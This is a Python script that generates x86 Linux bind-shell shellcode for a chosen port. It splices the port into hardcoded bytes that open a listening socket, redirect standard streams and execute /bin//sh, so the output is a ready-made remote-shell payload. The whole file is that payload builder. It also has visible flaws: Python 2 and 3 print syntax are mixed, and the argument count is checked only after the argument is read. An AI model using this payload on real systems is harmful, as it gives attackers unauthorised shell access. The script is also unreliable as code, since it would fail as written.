#!/usr/bin/python
import sys, socket

def usage():
        print("Usage: bind_shell_builder.py <port>")
        print("port must be between 1 and 65535")

def port_wrapper(port):
        port = hex(socket.htons(int(port)))
        if len(str(port[4:6])) < 2:
                port = "\\x" + port[4:6] +"0" + "\\x" + port[2:4]
        elif len(str(port[2:4])) < 2:
                port = "\\x" + port[4:6] + "\\x" + port[2:4] + "0"
        else:
                port = "\\x" + port[4:6] + "\\x" + port[2:4]
        return port

def main():
        green = lambda text: '\033[0;32m' + text + '\033[0m'
        port = int(sys.argv[1])

        if len(sys.argv) != 2:
                print("[-] You have to assign a port number!")
                usage()
                exit(0)

        if port < 1 or port > 65535:
                print("[-] This is not a valid port number!")
                usage()
                exit(0)

        if port <= 1024:
                print(green("[+] port requires root privileges"))

        port = port_wrapper(sys.argv[1])

        shellcode_first = ""
        shellcode_first += "\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\xb1\\x01\\xb3\\x02\\x66"
        shellcode_first += "\\xb8\\x67\\x01\\xcd\\x80\\x89\\xc7\\xb2\\x16\\x31\\xc9\\x51\\x51\\x66\\x68"
        shellcode_second = ""
        shellcode_second += "\\x66\\x6a\\x02\\x89\\xe1\\x89\\xfb\\x31\\xc0\\x66\\xb8\\x69\\x01"
        shellcode_second += "\\xcd\\x80\\x89\\xfb\\x66\\xb8\\x6b\\x01\\xcd\\x80\\x31\\xc0\\x31\\xdb\\x31"
        shellcode_second += "\\xc9\\x31\\xf6\\x89\\xfb\\x66\\xb8\\x6c\\x01\\xcd\\x80\\x31\\xff\\x89\\xc7"
        shellcode_second += "\\x31\\xdb\\x31\\xc9\\xb1\\x03\\x31\\xc0\\xb0\\x3f\\x89\\xfb\\xfe\\xc9\\xcd"
        shellcode_second += "\\x80\\x75\\xf4\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69"
        shellcode_second += "\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80";

        print green("Port " + sys.argv[1] + " converted")
        print green("[*]" + port + "\n")
        print '"' + shellcode_first + green(port) + shellcode_second + '"'

if __name__ == '__main__':
        main()
